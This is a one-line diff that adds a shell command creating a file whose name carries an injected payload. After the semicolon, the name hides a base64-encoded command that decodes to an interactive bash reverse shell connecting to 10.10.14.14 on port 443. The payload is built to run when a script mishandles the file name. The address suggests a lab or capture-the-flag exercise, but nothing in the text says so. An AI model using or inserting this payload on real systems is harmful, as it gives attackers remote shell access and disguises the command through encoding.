@@ -1,0 +1,1 @@
+touch "a;echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNC80NDMgMD4mMQ== | base64 -d | bash;cat 1 "
